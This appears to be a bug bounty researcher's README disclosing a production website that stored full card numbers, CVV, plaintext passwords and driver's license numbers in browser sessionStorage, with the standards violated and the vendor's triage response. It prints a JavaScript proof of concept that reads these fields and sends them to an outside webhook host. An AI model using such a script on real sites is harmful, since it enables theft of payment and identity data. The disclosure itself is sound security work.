🛑 Client-Side Sensitive Data Exposure on a Production Website – Full Credit Card, Password & ID Stored in Plaintext

Real-world disclosure of a critical web security flaw: full credit card details, login credentials, and ID numbers stored in plaintext in the browser’s memory. Discovered and responsibly disclosed via a public VDP on HackerOne.

⸻

📌 Summary

This repository documents a critical vulnerability discovered on a production website of a global company, where highly sensitive user data was stored in plaintext in the browser using sessionStorage and cookies, in violation of industry standards.

Exposed Data:
	•	Full credit card number (PAN), CVV, expiration date
	•	Driver’s license number
	•	Plaintext password
	•	Full user profile (name, email, phone, address)

This data was:
	•	Not encrypted, hashed, or protected
	•	Persisted across multiple authenticated pages
	•	Accessible to JavaScript, browser extensions, and DevTools
	•	Exfiltratable using a minimal PoC without XSS or elevated privileges

⸻

🔍 Technical Overview

After user login, the browser’s sessionStorage contained the following plaintext fields:

creditCardNumber, creditCardExpireMonth, creditCardExpireYear,
cvvNumber, skinnyPassword, driversLicense, personalAddress1,
firstName, lastName, email, phone

Any JavaScript running in the session context (e.g., from injected third-party libraries, browser extensions, or future XSS) could silently access and exfiltrate this data.

⸻

🧪 Proof of Concept

A minimal exfiltration script (executed in the browser console or by a malicious extension):

var stealthImage = new Image();
stealthImage.src = "https://webhook.site/xxx?" +
  "cc=" + encodeURIComponent(sessionStorage.getItem("creditCardNumber")) +
  "&cvv=" + encodeURIComponent(sessionStorage.getItem("cvvNumber")) +
  "&expMonth=" + encodeURIComponent(sessionStorage.getItem("creditCardExpireMonth")) +
  "&expYear=" + encodeURIComponent(sessionStorage.getItem("creditCardExpireYear")) +
  "&dl=" + encodeURIComponent(sessionStorage.getItem("driversLicense")) +
  "&pwd=" + encodeURIComponent(sessionStorage.getItem("skinnyPassword")) +
  "&email=" + encodeURIComponent(sessionStorage.getItem("email")) +
  "&phone=" + encodeURIComponent(sessionStorage.getItem("phone")) +
  "&url=" + encodeURIComponent(window.location.href);
document.body.appendChild(stealthImage);

📤 Data was successfully exfiltrated using Webhook.site, confirming real-world impact.

⸻

📜 Standards Violated
	•	🔴 PCI DSS 3.2 – Storing full credit card details and CVV post-authentication is strictly prohibited
	•	🟠 OWASP Secure Storage – Recommends avoiding storage of sensitive data in browser-accessible memory
	•	🔵 GDPR / CCPA – Mandate the secure storage and processing of personal and financial data

⸻

🔁 Vendor Response

The issue was responsibly disclosed via a public Vulnerability Disclosure Program (VDP) on HackerOne.

Initial triage feedback categorized the issue as Informative, stating:

“The present issue appears to be a self-XSS, which is not directly exploitable or would require convincing the user to copy/paste the JavaScript payload into the vulnerable field.”
— HackerOne Analyst

While this rationale reflects a focus on exploitability in the current session, the presence of this sensitive data in browser-accessible memory constitutes a severe architectural vulnerability, especially when combined with potential future client-side injection points.

A request for re-evaluation has been submitted, highlighting a successful PoC and partial post-report mitigation observed.

⸻

🔐 Security Takeaways

✔️ Never store sensitive information like credit card data or plaintext passwords on the client side
✔️ Treat all client-side storage as exposed
✔️ Don’t rely on “no XSS now = no risk” — threat landscapes evolve
✔️ Implement secure-by-design architecture from the beginning

⸻

👤 About the Researcher

cybernomad42
	•	Freelance pentester & bug bounty hunter
	•	Security consultant focused on client-side flaws, web app security, and compliance
	•	LinkedIn: linkedin.com/in/patrykkieszek
	•	HackerOne: hackerone.com/cybernomad42

⸻

📂 Repository Tags

bug-bounty pentesting sessionStorage plaintext-data credit-card-leak
client-side-vulnerability pci-dss owasp javascript-security cybersecurity